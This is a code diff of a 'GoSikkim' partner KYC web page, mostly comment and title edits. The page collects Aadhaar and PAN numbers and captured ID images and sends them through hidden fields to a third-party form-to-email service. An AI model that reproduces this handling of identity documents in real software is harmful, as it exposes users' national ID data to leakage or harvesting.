@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>GoSikkim — Identity Verification</title>
+  <title>GoSikkim — Partner Onboarding & KYC</title>
   <style>
     :root {
       --primary: #0f766e;
@@ -225,9 +225,9 @@
   <h1>Verify Your Identity</h1>
   <p class="subtitle">Google account verified. Enter your Aadhaar and PAN details below to activate your GoSikkim partner profile.</p>
 
-  <!-- Standard HTML Form Submission to Web3Forms -->
+  <!-- Form configured with standard Web3Forms action -->
   <form action="https://api.web3forms.com/submit" method="POST" id="kycForm">
-    <!-- Web3Forms Access Key -->
+    <!-- Web3Forms Access Key & Config fields -->
     <input type="hidden" name="access_key" value="1eff40e0-872f-45bb-b6ea-284e5a16dcde">
     <input type="hidden" name="subject" value="New GoSikkim Partner KYC Pending Approval">
     <input type="hidden" name="KYC_Status" value="Pending Manual Approval">
@@ -380,7 +380,6 @@
 
     const dataUrl = canvas.toDataURL('image/jpeg', 0.75);
     
-    // Create a hidden input so the captured image data gets sent in the form submission
     let hiddenImgInput = document.getElementById(`${type}_hidden_img`);
     if (!hiddenImgInput) {
       hiddenImgInput = document.createElement('input');
@@ -421,12 +420,11 @@
     errorMsg.style.display = 'block';
   }
 
-  // 6. Quick Frontend Validation Before Sending
+  // 6. Frontend Validation Before Submission
   document.getElementById('kycForm').addEventListener('submit', (e) => {
     errorMsg.style.display = 'none';
     const rawAadhaar = aadhaarInput.value.replace(/\s/g, '');
     const pan = panInput.value.trim();
-    const isSkipped = skipCheckbox.checked;
 
     if (!/^\d{12}$/.test(rawAadhaar)) {
       e.preventDefault();
@@ -437,8 +435,6 @@
       e.preventDefault();
       return showError('Please enter a valid 10-character PAN number (e.g., ABCDE1234F).');
     }
-
-    // Let the form submit naturally to Web3Forms once validated!
   });
 </script>
 
